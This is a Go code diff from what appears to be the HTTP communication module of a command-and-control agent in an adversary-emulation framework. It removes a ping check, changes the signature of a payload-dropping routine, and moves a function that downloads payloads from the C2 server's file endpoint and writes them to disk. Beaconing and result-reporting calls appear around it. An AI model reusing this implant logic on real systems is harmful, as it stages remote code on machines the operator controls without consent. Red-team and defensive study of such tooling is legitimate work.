@@ -26,18 +26,6 @@ func init() {
 	CommunicationChannels["HTTP"] = API{}
 }
 
-//Ping tests connectivity to the server
-func (contact API) Ping(profile map[string]interface{}) bool {
-	address := fmt.Sprintf("%s/ping", profile["server"].(string))
-	bites := request(address, nil)
-	if(string(bites) == "pong") {
-		output.VerbosePrint("[+] Ping success")
-		return true;
-	}
-	output.VerbosePrint("[+] Ping failure")
-	return false;
-}
-
 //GetInstructions sends a beacon and returns instructions
 func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
@@ -59,12 +47,12 @@ func (contact API) GetInstructions(profile map[string]interface{}) map[string]in
 }
 
 //DropPayloads downloads all required payloads for a command
-func (contact API) DropPayloads(profile map[string]interface{}, payload string) []string{
+func (contact API) DropPayloads(payload string, server string, uniqueId string, platform string) []string{
 	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
 	var droppedPayloads []string
 	for _, payload := range payloads {
 		if len(payload) > 0 {
-			droppedPayloads = append(droppedPayloads, contact.drop(payload, profile["server"].(string), profile["paw"].(string), profile["platform"].(string)))
+			droppedPayloads = append(droppedPayloads, contact.drop(payload, server, uniqueId, platform))
 		}
 	}
 	return droppedPayloads
@@ -82,6 +70,24 @@ func (contact API) C2RequirementsMet(profile map[string]interface{}, criteria in
 	output.VerbosePrint(fmt.Sprintf("Beacon API=%s", apiBeacon))
 	output.VerbosePrint(fmt.Sprintf("Result API=%s", apiResult))
 	return true
+}
+
+//Drop will download a single payload
+func (contact API) drop(payload string, server string, uniqueID string, platform string) string {
+	location := filepath.Join(payload)
+	if len(payload) > 0 && util.Exists(location) == false {
+		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
+		address := fmt.Sprintf("%s/file/download", server)
+		req, _ := http.NewRequest("POST", address, nil)
+		req.Header.Set("file", payload)
+		req.Header.Set("platform", platform)
+		client := &http.Client{}
+		resp, err := client.Do(req)
+		if err == nil && resp.StatusCode == ok {
+			util.WritePayload(location, resp)
+		}
+	}
+	return location
 }
 
 // Will obtain the payload bytes in memory to be written to disk later by caller.
@@ -113,24 +119,6 @@ func (contact API) SendExecutionResults(commandID interface{}, server interface{
 	link := fmt.Sprintf("%s", commandID.(string))
 	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
 	request(address, data)
-}
-
-//Drop will download a single payload
-func (contact API) drop(payload string, server string, uniqueID string, platform string) string {
-	location := filepath.Join(payload)
-	if len(payload) > 0 && util.Exists(location) == false {
-		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
-		address := fmt.Sprintf("%s/file/download", server)
-		req, _ := http.NewRequest("POST", address, nil)
-		req.Header.Set("file", payload)
-		req.Header.Set("platform", platform)
-		client := &http.Client{}
-		resp, err := client.Do(req)
-		if err == nil && resp.StatusCode == ok {
-			util.WritePayload(location, resp)
-		}
-	}
-	return location
 }
 
 func request(address string, data []byte) []byte {
